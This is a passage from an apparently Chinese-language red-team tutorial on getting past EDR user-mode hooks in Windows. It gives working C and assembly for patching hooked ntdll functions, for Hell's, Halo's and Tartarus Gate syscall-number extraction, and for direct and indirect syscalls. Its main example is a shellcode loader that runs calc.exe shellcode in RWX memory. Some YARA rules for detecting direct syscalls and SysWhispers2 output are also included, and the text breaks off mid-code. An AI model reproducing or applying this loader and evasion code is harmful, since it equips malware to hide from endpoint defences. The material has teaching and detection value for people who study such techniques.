printf(\u0026#34;NTAPI %s is hooked, its address is 0x%x\\n\u0026#34;, funcName, pFunctionAddress); DWORD_PTR pageStart = ((DWORD_PTR)pFunctionAddress / 0x1000) * 0x1000; printf(\u0026#34;Start address of the page is 0x%x\\n\u0026#34;, pageStart); DWORD oldProtection = 0; bool isProtected = VirtualProtect((PBYTE)pageStart, 0x1000, PAGE_EXECUTE_READWRITE, \u0026amp;oldProtection); memcpy(pFunctionAddress, cleanNTAPI, 0xb); isProtected = VirtualProtect((PBYTE)pageStart,0x1000, oldProtection, \u0026amp;oldProtection); return true; } return false; } } return false; } int main() { HMODULE ntdll; HMODULE kernel32; GetModule(\u0026amp;ntdll, \u0026amp;kernel32); printf(\u0026#34;ntdll base address: %p\\n\u0026#34;, ntdll); printf(\u0026#34;kernel32 base address: %p\\n\u0026#34;, kernel32); unsigned char cleanNtOpenProcess[] = \u0026#34;\\x4c\\x8b\\xd1\\xb8\\x26\\x00\\x00\\x00\\x0f\\x05\\xc3\u0026#34;; CheckFuncByName(ntdll, \u0026#34;NtOpenProcess\u0026#34;,cleanNtOpenProcess); CheckFuncByName(ntdll, \u0026#34;NtOpenProcess\u0026#34;,cleanNtOpenProcess); return 0; } 代码的 syscall stub 中保存的是最精简的指令，因为这足以成功发起 syscall。总之，通过补丁给定被 hook 的函数指令，可以实现对想要的函数进行 unhook。\n对于此方法，虽然比替换整个代码区动静要小一些，但因为原理相似，论 IOC 其实是差不多的。\n从挂起的进程中载入纯净 ntdll 模块 # 我们还可以通过读取挂起进程中载入的 ntdll 来获得纯净的副本，并用于 unhook。当进程以挂起或者被调试的状态被创建，此时只有 ntdll 被载入，EDR 还未来得及注入其检视 API 调用的模块。\n在这之后，我们可以通过 ReadProcessMemory 来读取载入的 ntdll 模块的代码区。要能精准地获取干净副本的代码区并实现 unhook，我们可以通过以下的步骤实现：\n使用 NtQueryInformationProcess API 获得远程挂起进程的 PEB 地址 通过 PEB Walking 的方法获得远程进程中载入的纯净 ntdll 地址。因为是远程进程，步骤会不那么直接一些。 因为都是已经载入到内存的 ntdll，解析当前载入的 ntdll 模块(即被 hook 的) 从而获取代码区的 RVA 以及尺寸 从纯净的 ntdll 模块的代码区开始读取，直到读取字节数达到尺寸 覆盖被 hook 的代码区实现 unhook 知道了原理与流程后，作为一道练习题，请学员们尝试自行完成完整代码，并分析该方法有哪些 IOC。\n"},{"id":8,"href":"/docs/%E5%85%B6%E4%BB%96/Hooking/3.%E8%B0%83%E7%94%A8syscall%E5%AE%9E%E7%8E%B0%E7%94%A8%E6%88%B7%E6%80%81Hook%E7%BB%95%E8%BF%87/","title":"3.调用syscall实现用户态 Hook绕过","section":"Docs","content":" 3. 调用syscall实现用户态Hook绕过 # 在上个小节，我们主要是通过对 ntdll 模块进行覆盖或者补丁来移除 hook 实现用户态 hook 的绕过。但是这些方法涉及到对 ntdll 的纂改，以及对内存权限的修改，具有一定的风险。实际上，我们还有其他途径来实现 hook 的绕过。\n提取 syscall 号码 # 我们可以在 C 项目里定义汇编函数，来实现 NTAPI。我们知道，只需要最少 4 条指令，我们便能成功执行 syscall。但在执行 syscall 之前，我们需要获得目标函数的 SSN。我们可以从磁盘中读取一份干净的 ntdll 并解析得到 SSN，但从磁盘中读取 ntdll 会显得有些可疑，因此最好是解析载入的 ntdll 并设法获得 SSN。\nHells Gate # Hells Gate 通过 PEB Walking 的方法得到加载的 ntdll 地址以及想要获得 SSN 的函数地址。通过对关键字节的比较来确定这是一个有效的 syscall stub，从而提取出 SSN。其实上个小节我们已经用了这个逻辑了。\n原始代码关键部分如下：\nif (*((PBYTE)pFunctionAddress + cw) == 0x4c \u0026amp;\u0026amp; *((PBYTE)pFunctionAddress + 1 + cw) == 0x8b \u0026amp;\u0026amp; *((PBYTE)pFunctionAddress + 2 + cw) == 0xd1 \u0026amp;\u0026amp; *((PBYTE)pFunctionAddress + 3 + cw) == 0xb8 \u0026amp;\u0026amp; *((PBYTE)pFunctionAddress + 6 + cw) == 0x00 \u0026amp;\u0026amp; *((PBYTE)pFunctionAddress + 7 + cw) == 0x00) { BYTE high = *((PBYTE)pFunctionAddress + 5 + cw); BYTE low = *((PBYTE)pFunctionAddress + 4 + cw); pVxTableEntry-\u0026gt;wSystemCall = (high \u0026lt;\u0026lt; 8) | low; break; } 但是，如果要搜索的函数被 hook 了，那么 SSN 可能不会存在于 syscall stub 里(取决于是什么 EDR 以及覆盖了哪些指令)，这样的话，就不能成功获得 ssn 了。因此，Halos Gate 对此进行了改善。\nHalos Gate # 我们发现，在 ntdll 里，随着地址的增高，NTAPI 的 SSN 是递增的，反之则递减。因此，如果我们想要搜索的 NTAPI 被 hook 了，可以向上和向下同时继续搜索，例如往下搜索了 2 跳发现了一个未被 hook 的 NTAPI，那么要搜索的 NTAPI 的 SSN 就是这个未被 hook 的 NTAPI 的 SSN 再减去 2，即 Desired_SSN = Clean_SSN - Hop。\n关键代码部分如下：\nint GoUp -32; int GoDown 32; // If the first instruction of the syscall is a an inconditional jump (aka it\u0026#39;s hooked) if (*((PBYTE)pFunctionAddress) == 0xe9) { // Search beginning pattern of syscall stub through 500 function up and down from our location for (WORD index = 1; index \u0026lt;= 500; index++) { // Search the begining of a syscall stub in the next function down if (*((PBYTE)pFunctionAddress + index * GoDown) == 0x4c \u0026amp;\u0026amp; *((PBYTE)pFunctionAddress + 1 + index * GoDown) == 0x8b \u0026amp;\u0026amp; *((PBYTE)pFunctionAddress + 2 + index * GoDown) == 0xd1 \u0026amp;\u0026amp; *((PBYTE)pFunctionAddress + 3 + index * GoDown) == 0xb8 \u0026amp;\u0026amp; *((PBYTE)pFunctionAddress + 6 + index * GoDown) == 0x00 \u0026amp;\u0026amp; *((PBYTE)pFunctionAddress + 7 + index * GoDown) == 0x00) { BYTE high = *((PBYTE)pFunctionAddress + 5 + index * GoDown); BYTE low = *((PBYTE)pFunctionAddress + 4 + index * GoDown); // substract the index from the current syscall identifier to find the one of our target function pVxTableEntry-\u0026gt;wSystemCall = (high \u0026lt;\u0026lt; 8) | low - index; return TRUE; } // Search the begining of a syscall stub in the next function down if (*((PBYTE)pFunctionAddress + index * GoUp) == 0x4c \u0026amp;\u0026amp; *((PBYTE)pFunctionAddress + 1 + index * GoUp) == 0x8b \u0026amp;\u0026amp; *((PBYTE)pFunctionAddress + 2 + index * GoUp) == 0xd1 \u0026amp;\u0026amp; *((PBYTE)pFunctionAddress + 3 + index * GoUp) == 0xb8 \u0026amp;\u0026amp; *((PBYTE)pFunctionAddress + 6 + index * GoUp) == 0x00 \u0026amp;\u0026amp; *((PBYTE)pFunctionAddress + 7 + index * GoUp) == 0x00) { BYTE high = *((PBYTE)pFunctionAddress + 5 + index * GoUp); BYTE low = *((PBYTE)pFunctionAddress + 4 + index * GoUp); // substract the index from the current syscall identifier to find the one of our target function pVxTableEntry-\u0026gt;wSystemCall = (high \u0026lt;\u0026lt; 8) | low + index; return TRUE; } } 代码里定义了最大搜索跳数为 32，搜索时确实需要注意边界。Halos Gate 也有个小局限性，它以第一条指令是否是 jmp 从而判断函数是否被 hook 了。我们之前说了，不同的 EDR 覆盖的指令不同，有的 EDR 覆盖的不是第 1 条指令，可以是 syscall 之前的任何指令。例如 CrowdStrike 覆盖的是第 2 条指令。\nTartarus Gate # Tartarus Gate 相比 Halos Gate 的改动比较小，主要是考虑了更多 EDR 可能 hook 的情况，例如上面截图所示的情况。对前 4 字节逐一对比，还是相对比较可靠的判断。当然了，hook 导致的指令覆盖可能在 syscall 指令之前的任何字节，如果不放心的话，可以增加更多字节比较。\n下面的代码是我个人对动态获取 SSN 的实现：\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;windows.h\u0026gt; #include \u0026lt;winternl.h\u0026gt; #include \u0026lt;stdint.h\u0026gt; #include \u0026lt;string.h\u0026gt; //Get module handle for ntdll and kernel32 at the same time void GetModule(HMODULE* ntdll, HMODULE* kernel32) { PPEB peb = (PPEB)(__readgsqword(0x60)); PPEB_LDR_DATA ldr = *(PPEB_LDR_DATA*)((PBYTE)peb + 0x18); //PPEB_LDR_DATA pLdr = pPeb-\u0026gt;Ldr; PLIST_ENTRY ntdlllistentry = *(PLIST_ENTRY*)((PBYTE)ldr + 0x30); *ntdll = *(HMODULE*)((PBYTE)ntdlllistentry + 0x10); PLIST_ENTRY kernelbaselistentry = *(PLIST_ENTRY*)((PBYTE)ntdlllistentry); PLIST_ENTRY kernel32listentry = *(PLIST_ENTRY*)((PBYTE)kernelbaselistentry); *kernel32 = *(HMODULE*)((PBYTE)kernel32listentry + 0x10); } unsigned char QuickGetSSN(PBYTE pFunctionAddress) { const int maxOffset = 10; // You can adjust this based on your requirements. int offset; unsigned char ssn_low = -1; unsigned char ssn_high = -1; unsigned char ssn = -1; if (pFunctionAddress[0] == 0x4C \u0026amp;\u0026amp; pFunctionAddress[1] == 0x8B \u0026amp;\u0026amp; pFunctionAddress[2] == 0xD1 \u0026amp;\u0026amp; pFunctionAddress[3] == 0xB8) { printf(\u0026#34;The function is clean\\n\u0026#34;); char ssn = *((unsigned char*)(pFunctionAddress + 4)); printf(\u0026#34;ID of searched function is: 0x%x\\n\u0026#34;, ssn); return ssn; } else { printf(\u0026#34;The function is hooked\\n\u0026#34;); // Search both upwards and downwards. for (offset = 1; offset \u0026lt;= maxOffset; ++offset) { // Check upwards. PBYTE checkAddress = pFunctionAddress - (0x20 * offset); if (checkAddress[0] == 0x4C \u0026amp;\u0026amp; checkAddress[1] == 0x8B \u0026amp;\u0026amp; checkAddress[2] == 0xD1 \u0026amp;\u0026amp; checkAddress[3] == 0xB8) { ssn_low = *((unsigned char*)(checkAddress + 4)); ssn_high = *((unsigned char*)(checkAddress + 5)); ssn = ssn_low * 1 + ssn_high * 16; printf(\u0026#34;Clean sequence found upwards at offset -0x%x, SSN of the unhooked function is 0x%x\\n\u0026#34;, offset, ssn); printf(\u0026#34;SSN of searched NTAPI is 0x%x\\n\u0026#34;, (offset + ssn)); return ssn+offset; } // Check downwards. checkAddress = pFunctionAddress + (0x20 * offset); if (checkAddress[0] == 0x4C \u0026amp;\u0026amp; checkAddress[1] == 0x8B \u0026amp;\u0026amp; checkAddress[2] == 0xD1 \u0026amp;\u0026amp; checkAddress[3] == 0xB8) { ssn_low = *((unsigned char*)(checkAddress + 4)); ssn_high = *((unsigned char*)(checkAddress + 5)); ssn = ssn_low * 1 + ssn_high * 16; printf(\u0026#34;Clean sequence found downwards at offset 0x%x, SSN of the unhooked function is 0x%x\\n\u0026#34;,offset, ssn); printf(\u0026#34;SSN of searched NTAPI is 0x%x\\n\u0026#34;, (offset - ssn)); return ssn-offset; } } } } unsigned char GetSSNByName(IN HMODULE hModule, const CHAR* funcName) { PBYTE pBase = (PBYTE)hModule; unsigned char ssn_low = -1; unsigned char ssn_high = -1; unsigned char ssn = -1; PIMAGE_DOS_HEADER pImgDosHdr = (PIMAGE_DOS_HEADER)pBase; if (pImgDosHdr-\u0026gt;e_magic != IMAGE_DOS_SIGNATURE) return -1; PIMAGE_NT_HEADERS pImgNtHdrs = (PIMAGE_NT_HEADERS)(pBase + pImgDosHdr-\u0026gt;e_lfanew); if (pImgNtHdrs-\u0026gt;Signature != IMAGE_NT_SIGNATURE) return -1; IMAGE_OPTIONAL_HEADER ImgOptHdr = pImgNtHdrs-\u0026gt;OptionalHeader; PIMAGE_EXPORT_DIRECTORY pImgExportDir = (PIMAGE_EXPORT_DIRECTORY)(pBase + ImgOptHdr.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress); PDWORD FunctionNameArray = (PDWORD)(pBase + pImgExportDir-\u0026gt;AddressOfNames); PDWORD FunctionAddressArray = (PDWORD)(pBase + pImgExportDir-\u0026gt;AddressOfFunctions); PWORD FunctionOrdinalArray = (PWORD)(pBase + pImgExportDir-\u0026gt;AddressOfNameOrdinals); for (DWORD i = 0; i \u0026lt; pImgExportDir-\u0026gt;NumberOfFunctions; i++) { CHAR* pFunctionName = (CHAR*)(pBase + FunctionNameArray[i]); PBYTE pFunctionAddress = (PBYTE)(pBase + FunctionAddressArray[FunctionOrdinalArray[i]]); if (_stricmp(funcName, pFunctionName) == 0) { if (pFunctionAddress[0] == 0x4C \u0026amp;\u0026amp; pFunctionAddress[1] == 0x8B \u0026amp;\u0026amp; pFunctionAddress[2] == 0xD1 \u0026amp;\u0026amp; pFunctionAddress[3] == 0xB8) { printf(\u0026#34;NTAPI %s may not be hooked\\n\u0026#34;, funcName); ssn_low = *((unsigned char*)(pFunctionAddress + 4)); ssn_high = *((unsigned char*)(pFunctionAddress + 5)); ssn = ssn_low * 1 + ssn_high * 16; printf(\u0026#34;Syscall number of function %s is: 0x%x\\n\u0026#34;, pFunctionName,ssn); return ssn; } else { printf(\u0026#34;NTAPI %s is hooked, check surrounding functions\\n\u0026#34;, funcName); ssn = QuickGetSSN(pFunctionAddress); printf(\u0026#34;Syscall number of function %s is: 0x%x\\n\u0026#34;, pFunctionName, ssn); return ssn; } return -1; } } return -1; } int main() { HMODULE ntdll; HMODULE kernel32; GetModule(\u0026amp;ntdll, \u0026amp;kernel32); printf(\u0026#34;ntdll base address: %p\\n\u0026#34;, ntdll); printf(\u0026#34;kernel32 base address: %p\\n\u0026#34;, kernel32); unsigned char ssn =GetSSNByName(ntdll, \u0026#34;NtOpenProcess\u0026#34;); printf(\u0026#34;SSN of the NtOpenProcess is 0x%x\\n\u0026#34;, ssn); return 0; } 我们人为地给 NtOpenProcess，以及其前向 2 个函数、后向 3 个函数都进行了指令覆盖来模拟 hook。最终，程序成功地发现前向第 3 个函数是没有被 hook 的，提取了其 SSN 后加上 3，得到了 NtOpenProcess 的 SSN。\n直接调用 Syscall # 有了目标函数的 SSN，我们便可以用汇编代码实现 NTAPI 并进行调用了。这里，我们将先讨论直接调用 syscall。我们以经典的 VirtualAlloc + WriteProcessMemory(或者是其他复制数据的函数) + CreateThread + WaitForSingleObject 的代码执行方法为例，当然了，我们使用的是这些 API 的 NTAPI 版本，执行 calc 的 shellcode。\n直接 syscall # 在 C 源代码文件里定义 NtAllocateVirtualMemory 函数以及所需的结构体(尽管该 NTAPI 没有所需的结构体)，而在 asm 文件里用汇编代码实现函数功能，这里我们实现 NtAllocateVirtualMemory 的 syscall stub 即可。 EXTERN_C 宏允许链接器将该函数定义与汇编代码链接起来，需要保持名称相同。这样，我们就能像调用一般函数一样调用定义的汇编函数了。\nEXTERN_C NTSTATUS NtAllocateVirtualMemory( IN HANDLE ProcessHandle, IN OUT PVOID* BaseAddress, IN ULONG ZeroBits, IN OUT PSIZE_T RegionSize, IN ULONG AllocationType, IN ULONG Protect); .code \u0026lt;...SNIP...\u0026gt; NtAllocateVirtualMemory PROC mov r10, rcx mov rax, 18h syscall ret NtAllocateVirtualMemory ENDP \u0026lt;...SNIP...\u0026gt; end 以此类推，我们接着去定义其他所需的函数，例如 NtWriteVirtualMemory，NtCreateThreadEx，NtWaitForSingleObject，NtClose 等。因为这些 NTAPI 大都没有微软官方的文档，因此我们需要借助搜索引擎参考已有项目对其的用法。完成后的代码如下：\nDirectSyscall.c 代码\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;Windows.h\u0026gt; typedef struct _PS_ATTRIBUTE { ULONG Attribute; SIZE_T Size; union { ULONG Value; PVOID ValuePtr; } u1; PSIZE_T ReturnLength; } PS_ATTRIBUTE, * PPS_ATTRIBUTE; typedef struct _UNICODE_STRING { USHORT Length; USHORT MaximumLength; PWSTR Buffer; } UNICODE_STRING, * PUNICODE_STRING; typedef struct _OBJECT_ATTRIBUTES { ULONG Length; HANDLE RootDirectory; PUNICODE_STRING ObjectName; ULONG Attributes; PVOID SecurityDescriptor; PVOID SecurityQualityOfService; } OBJECT_ATTRIBUTES, * POBJECT_ATTRIBUTES; typedef struct _PS_ATTRIBUTE_LIST { SIZE_T TotalLength; PS_ATTRIBUTE Attributes[1]; } PS_ATTRIBUTE_LIST, * PPS_ATTRIBUTE_LIST; EXTERN_C NTSTATUS NtAllocateVirtualMemory( IN HANDLE ProcessHandle, IN OUT PVOID* BaseAddress, IN ULONG ZeroBits, IN OUT PSIZE_T RegionSize, IN ULONG AllocationType, IN ULONG Protect); EXTERN_C NTSTATUS NtWriteVirtualMemory( IN HANDLE ProcessHandle, IN PVOID BaseAddress, IN PVOID Buffer, IN SIZE_T NumberOfBytesToWrite, OUT PSIZE_T NumberOfBytesWritten OPTIONAL); EXTERN_C NTSTATUS NtCreateThreadEx( OUT PHANDLE ThreadHandle, IN ACCESS_MASK DesiredAccess, IN POBJECT_ATTRIBUTES ObjectAttributes OPTIONAL, IN HANDLE ProcessHandle, IN PVOID StartRoutine, IN PVOID Argument OPTIONAL, IN ULONG CreateFlags, IN SIZE_T ZeroBits, IN SIZE_T StackSize, IN SIZE_T MaximumStackSize, IN PPS_ATTRIBUTE_LIST AttributeList OPTIONAL); EXTERN_C NTSTATUS NtWaitForSingleObject( IN HANDLE ObjectHandle, IN BOOLEAN Alertable, IN PLARGE_INTEGER TimeOut OPTIONAL); EXTERN_C NTSTATUS NtClose( IN HANDLE Handle); int main() { // calc.exe shellcode unsigned char code[] = \u0026#34;\\x48\\x31\\xd2\\x65\\x48\\x8b\\x42\\x60\\x48\\x8b\\x70\\x18\\x48\\x8b\\x76\\x20\\x4c\\x8b\\x0e\\x4d\\x8b\\x09\\x4d\\x8b\\x49\\x20\\xeb\\x63\\x41\\x8b\\x49\\x3c\\x4d\\x31\\xff\\x41\\xb7\\x88\\x4d\\x01\\xcf\\x49\\x01\\xcf\\x45\\x8b\\x3f\\x4d\\x01\\xcf\\x41\\x8b\\x4f\\x18\\x45\\x8b\\x77\\x20\\x4d\\x01\\xce\\xe3\\x3f\\xff\\xc9\\x48\\x31\\xf6\\x41\\x8b\\x34\\x8e\\x4c\\x01\\xce\\x48\\x31\\xc0\\x48\\x31\\xd2\\xfc\\xac\\x84\\xc0\\x74\\x07\\xc1\\xca\\x0d\\x01\\xc2\\xeb\\xf4\\x44\\x39\\xc2\\x75\\xda\\x45\\x8b\\x57\\x24\\x4d\\x01\\xca\\x41\\x0f\\xb7\\x0c\\x4a\\x45\\x8b\\x5f\\x1c\\x4d\\x01\\xcb\\x41\\x8b\\x04\\x8b\\x4c\\x01\\xc8\\xc3\\xc3\\x41\\xb8\\x98\\xfe\\x8a\\x0e\\xe8\\x92\\xff\\xff\\xff\\x48\\x31\\xc9\\x51\\x48\\xb9\\x63\\x61\\x6c\\x63\\x2e\\x65\\x78\\x65\\x51\\x48\\x8d\\x0c\\x24\\x48\\x31\\xd2\\x48\\xff\\xc2\\x48\\x83\\xec\\x28\\xff\\xd0\u0026#34;; LPVOID allocation_start; SIZE_T allocation_size = sizeof(code); HANDLE hThread; NTSTATUS status; allocation_start = nullptr; // Allocate Virtual Memory if (NtAllocateVirtualMemory(GetCurrentProcess(), \u0026amp;allocation_start, 0, (PULONG64)\u0026amp;allocation_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE)==0) printf(\u0026#34;Memory allocated at %p\\n\u0026#34;, allocation_start); else printf(\u0026#34;Allocated failed, Error code is %d\\n\u0026#34;,GetLastError()); // Copy shellcode into allocated memory if (NtWriteVirtualMemory(GetCurrentProcess(), allocation_start, code, sizeof(code), 0)==0) printf(\u0026#34;Copied successfully\\n\u0026#34;); else printf(\u0026#34;Copied failed, Error code is %d\\n\u0026#34;, GetLastError()); if (NtCreateThreadEx(\u0026amp;hThread, GENERIC_EXECUTE, NULL, GetCurrentProcess(), (LPTHREAD_START_ROUTINE)allocation_start, NULL, FALSE, NULL, NULL, NULL, NULL)==0) printf(\u0026#34;Executed successfully\\n\u0026#34;); else printf(\u0026#34;Executed failed, Error code is %d\\n\u0026#34;, GetLastError()); // Wait for the end of the thread and close the handle NtWaitForSingleObject(hThread, FALSE, NULL); NtClose(hThread); return 0; } stub.asm 代码\n.code NtAllocateVirtualMemory PROC mov r10, rcx mov rax, 18h syscall ret NtAllocateVirtualMemory ENDP NtWriteVirtualMemory PROC mov r10, rcx mov rax, 3Ah syscall ret NtWriteVirtualMemory ENDP NtCreateThreadEx PROC mov r10, rcx mov rax, 0C2h syscall ret NtCreateThreadEx ENDP NtWaitForSingleObject PROC mov r10, rcx mov rax, 4 syscall ret NtWaitForSingleObject ENDP NtClose PROC mov r10, rcx mov rax, 0Fh syscall ret NtClose ENDP end 为了能编译 masm 文件，我们右键项目，选择 Build Dependencies -\u0026gt; Build Customizations，勾选 masm。\n右键 asm 代码文件选择属性，General -\u0026gt; Item Type 选项选择 Microsoft Macro Assembler。\n这样我们便能编译项目里的 masm 代码了。编译后运行程序，我们发现 shellcode 得以成功运行。\n不过直接 syscall 调用的弊端也是比较显著的，汇编函数在编译后成为操作码存在于程序的代码区，汇编代码与操作码是可预测的一一对应的关系。因此，如果没有对 syscall stub 进行混淆的话，我们可以用如下 yara 规则来检测包含直接 syscall 调用的程序：\nrule direct_syscall { meta: description = \u0026#34;Hunt for direct syscall\u0026#34; strings: $s1 = {4c 8b d1 48 c7 c0 ?? ?? ?? ?? 0f 05 c3} $s2 = {4C 8b d1 b8 ?? ?? ?? ?? 0F 05 C3} condition: #s1 \u0026gt;=1 or #s2 \u0026gt;=1 } 我们定义了 5 个 syscall stub，都被检测到了。我们可以插入一些 NOP 类(即无实际意义、不影响运行结果) 的指令用于混淆 syscall stub。但即便有混淆，0xf 0x5(syscall) 指令始终存在于代码区，这是可疑的。\n此外，从调用栈的视角，是我们程序的某一函数发起了 syscall，而不是 ntdll 空间内的 NTAPI，这是非常可疑的。\nsyswhisper 1\u0026amp;2 # Syswhisper 1 和 2 可以自动地帮我们生成 C 项目的头文件以及 asm 文件，方便我们发起直接 syscall。Syswhisper 1 是通过检查操作系统的版本从而确定给定 NTAPI 的 SSN，这算是硬编码了，不够灵活。\nsyswhisper 2 将所有 Zw 开头的函数按照地址排序存储进数组里，SSN 与函数地址高低是正相关，因此，要寻找的函数的 SSN 即为该函数地址在数组里的索引。\n至于为什么以 Zw 开头，因为其实 NTAPI 的 NT 与 ZW 版本指向同一地址。\n使用 syswhisper 2 的 python 脚本生成所需的头文件，c 文件以及 asm 文件，可以生成所有的 NTAPI 的相关代码，也可以只生成指定或常用的 NTAPI 的。\n因为有 asm 文件，所以我们依旧需要启用 masm。把生成的头文件加入到 Header Files 中，c 文件与 asm 文件添加至 Source Files 中。\n对于主函数的代码，我们可以复用之前的，但别忘了添加 syswhisper2 生成的头文件。就这样，我们也成功执行了 shellcode。\n我们可以根据 asm 文件中的 WhisperMain 函数代码创建 yara 规则。\n样本规则如下所示：\nrule syswhisper2 { meta: description = \u0026#34;Hunt for syswhisper2 generated asm code\u0026#34; strings: $s1 = {58 48 89 4C 24 08 48 89 54 24 10 4C 89 44 24 18 4C 89 4C 24 20 48 83 EC 28 8B 0D ?? ?? 00 00 E8 ?? ?? ?? ?? 48 83 C4 28 48 8B 4C 24 08 48 8B 54 24 10 4C 8B 44 24 18 4C 8B 4C 24 20 4C 8B D1 0F 05 C3} condition: #s1 \u0026gt;=1 } 这样，我们用 yara 检测到了使用 syswhisper2 的程序。当然了，可以对该函数进行混淆，不过调用栈的嫌疑也很大。\n间接调用 Syscall # 因为直接 syscall 在调用栈上有着难以掩盖的检测点，间接调用 syscall 应运而生。间接调用 syscall 这个分类下其实也衍生出了多种方法，也包括我近期提出的 MutationGate。\n间接 syscall # 间接 syscall 的宗旨是与其直接在程序内执行 syscall 指令，不如在 ntdll 模块里寻找一条 syscall 指令，记录其地址，并在项目中用汇编代码定义的 syscall stub 中，将原本的 syscall 指令替换为 jmp \u0026lt;syscall 地址\u0026gt; 指令。如下所示：\nNtAllocateVirtualMemory PROC mov r10, rcx mov eax, (ssn of NtAllocateVirtualMemory) jmp (address of a syscall instruction) ret NtAllocateVirtualMemory ENDP 我们可以用如下代码获得给定 NTAPI 的 syscall 指令的地址。不过，从函数调用成功的角度来看，我们其实不是非得要获得目标 NTAPI 的 syscall 指令的地址。syscall 是一种特殊的 call 指令，根据 RAX/EAX 的值来确定内核层的对应函数，而非 syscall 指令所在的地址。也就是说，如果我们能在其他 DLL 中找到 syscall 指令，也是可以用的。如果我们刻意地选用良性 NTAPI 的 syscall 指令而非目标 NTAPI 的，可能会带来规避上的优势，但也可能适得其反，这取决于 EDR 的检测逻辑。毕竟，在内核层从调用栈或返回地址的角度是可以看出端倪的。\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;windows.h\u0026gt; #include \u0026lt;winternl.h\u0026gt; #include \u0026lt;stdint.h\u0026gt; #include \u0026lt;string.h\u0026gt; //Get module handle for ntdll and kernel32 at the same time void GetModule(HMODULE* ntdll, HMODULE* kernel32) { PPEB peb = (PPEB)(__readgsqword(0x60)); PPEB_LDR_DATA ldr = *(PPEB_LDR_DATA*)((PBYTE)peb + 0x18); //PPEB_LDR_DATA pLdr = pPeb-\u0026gt;Ldr; PLIST_ENTRY ntdlllistentry = *(PLIST_ENTRY*)((PBYTE)ldr + 0x30); *ntdll = *(HMODULE*)((PBYTE)ntdlllistentry + 0x10); PLIST_ENTRY kernelbaselistentry = *(PLIST_ENTRY*)((PBYTE)ntdlllistentry); PLIST_ENTRY kernel32listentry = *(PLIST_ENTRY*)((PBYTE)kernelbaselistentry); *kernel32 = *(HMODULE*)((PBYTE)kernel32listentry + 0x10); } PBYTE GetSyscallAddr(IN HMODULE hModule, const CHAR* funcName) { PBYTE pBase = (PBYTE)hModule; PBYTE syscall; PIMAGE_DOS_HEADER pImgDosHdr = (PIMAGE_DOS_HEADER)pBase; if (pImgDosHdr-\u0026gt;e_magic != IMAGE_DOS_SIGNATURE) return 0; PIMAGE_NT_HEADERS pImgNtHdrs = (PIMAGE_NT_HEADERS)(pBase + pImgDosHdr-\u0026gt;e_lfanew); if (pImgNtHdrs-\u0026gt;Signature != IMAGE_NT_SIGNATURE) return 0; IMAGE_OPTIONAL_HEADER ImgOptHdr = pImgNtHdrs-\u0026gt;OptionalHeader; PIMAGE_EXPORT_DIRECTORY pImgExportDir = (PIMAGE_EXPORT_DIRECTORY)(pBase + ImgOptHdr.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress); PDWORD FunctionNameArray = (PDWORD)(pBase + pImgExportDir-\u0026gt;AddressOfNames); PDWORD FunctionAddressArray = (PDWORD)(pBase + pImgExportDir-\u0026gt;AddressOfFunctions); PWORD FunctionOrdinalArray = (PWORD)(pBase + pImgExportDir-\u0026gt;AddressOfNameOrdinals); for (DWORD i = 0; i \u0026lt; pImgExportDir-\u0026gt;NumberOfFunctions; i++) { CHAR* pFunctionName = (CHAR*)(pBase + FunctionNameArray[i]); PBYTE pFunctionAddress = (PBYTE)(pBase + FunctionAddressArray[FunctionOrdinalArray[i]]); if (_stricmp(funcName, pFunctionName) == 0) { syscall = (pFunctionAddress + 0x12); return syscall; } } return 0; } int main() { HMODULE ntdll; HMODULE kernel32; GetModule(\u0026amp;ntdll, \u0026amp;kernel32); printf(\u0026#34;ntdll base address: %p\\n\u0026#34;, ntdll); printf(\u0026#34;kernel32 base address: %p\\n\u0026#34;, kernel32); PBYTE syscall_addr = GetSyscallAddr(ntdll, \u0026#34;NtOpenProcess\u0026#34;); printf(\u0026#34;Address of syscall instruction is 0x%p\\n\u0026#34;, syscall_addr); return 0; } 这样，我们成功地获得了一条 syscall 指令的地址，与我们在 WinDBG 中查看到的一致。\n有了 syscall 指令的地址，那么可以得到如下代码(依旧启用 masm)：\nindirectsyscall.cpp 代码\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;windows.h\u0026gt; #include \u0026lt;winternl.h\u0026gt; #include \u0026lt;stdint.h\u0026gt; #include \u0026lt;string.h\u0026gt; extern \u0026#34;C\u0026#34; { UINT_PTR syscall_addr1; UINT_PTR syscall_addr2; UINT_PTR syscall_addr3; UINT_PTR syscall_addr4; UINT_PTR syscall_addr5; } typedef struct _PS_ATTRIBUTE { ULONG Attribute; SIZE_T Size; union { ULONG Value; PVOID ValuePtr; } u1; PSIZE_T ReturnLength; } PS_ATTRIBUTE, * PPS_ATTRIBUTE; typedef struct _PS_ATTRIBUTE_LIST { SIZE_T TotalLength; PS_ATTRIBUTE Attributes[1]; } PS_ATTRIBUTE_LIST, * PPS_ATTRIBUTE_LIST; EXTERN_C NTSTATUS NtAllocateVirtualMemory( IN HANDLE ProcessHandle, IN OUT PVOID* BaseAddress, IN ULONG ZeroBits, IN OUT PSIZE_T RegionSize, IN ULONG AllocationType, IN ULONG Protect); EXTERN_C NTSTATUS NtWriteVirtualMemory( IN HANDLE ProcessHandle, IN PVOID BaseAddress, IN PVOID Buffer, IN SIZE_T NumberOfBytesToWrite, OUT PSIZE_T NumberOfBytesWritten OPTIONAL); EXTERN_C NTSTATUS NtCreateThreadEx( OUT PHANDLE ThreadHandle, IN ACCESS_MASK DesiredAccess, IN POBJECT_ATTRIBUTES ObjectAttributes OPTIONAL, IN HANDLE ProcessHandle, IN PVOID StartRoutine, IN PVOID Argument OPTIONAL, IN ULONG CreateFlags, IN SIZE_T ZeroBits, IN SIZE_T StackSize, IN SIZE_T MaximumStackSize, IN PPS_ATTRIBUTE_LIST AttributeList OPTIONAL); EXTERN_C NTSTATUS NtWaitForSingleObject( IN HANDLE ObjectHandle, IN BOOLEAN Alertable, IN PLARGE_INTEGER TimeOut OPTIONAL); EXTERN_C NTSTATUS NtClose( IN HANDLE Handle); void GetModule(HMODULE* ntdll, HMODULE* kernel32) { PPEB peb = (PPEB)(__readgsqword(0x60)); PPEB_LDR_DATA ldr = *(PPEB_LDR_DATA*)((PBYTE)peb + 0x18); //PPEB_LDR_DATA pLdr = pPeb-\u0026gt;Ldr; PLIST_ENTRY ntdlllistentry = 